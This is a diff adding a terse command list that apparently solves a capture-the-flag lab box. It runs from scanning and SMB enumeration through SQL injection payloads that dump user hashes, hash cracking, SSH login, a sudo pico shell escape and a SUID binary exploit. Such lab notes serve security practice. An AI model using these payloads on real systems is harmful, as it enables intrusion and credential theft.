@@ -1,0 +1,19 @@
+1 - nmap -A 10.10.88.247
+2 - smbclient -L \\10.10.88.247
+3 - smbclient \\\\10.10.88.247\\sambashare
+4 - http://10.10.88.247
+5 - echo "10.10.88.247 hogwartz-castle.thm" | tee -a /etc/hosts
+6 - http://hogwartz-castle.thm/login -> Burp Suite -> Repeater
+7 - user=%27+UNION+SELECT+NULL,NULL,NULL,NULL--&password=b
+8 - user=%27+UNION+SELECT+'a',NULL,NULL,'a'--&password=b
+9 - user=%27+UNION+SELECT+sqlite_version(),NULL,NULL,'a'--&password=b
+10 - user=%27+UNION+SELECT+tbl_name,NULL,NULL,NULL+FROM+sqlite_master+WHERE+type='table'+and+tbl_name+NOT+like+'sqlite_%'--&password=b
+11 - user=%27+UNION+SELECT+name,NULL,NULL,password+from+users--&password=b
+12 - user=%27+UNION+SELECT+group_concat(name,password),NULL,NULL,NULL+from+users--&password=b
+13 - hashcat -m 1700 -a 0 hashes.txt -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt
+14 - ssh harry@10.10.88.247
+15 - cat user1.txt
+16 - sudo -l (pico)
+17 - sudo -u hermonice pico, ^R^X, reset; bash 1>&0 2>&0
+18 - find / -perm -u=s -type f 2>/dev/null
+19 - echo 1 | /srv/time-turner/swagger | tr -dc '0-9' | /srv/time-turner/swagger
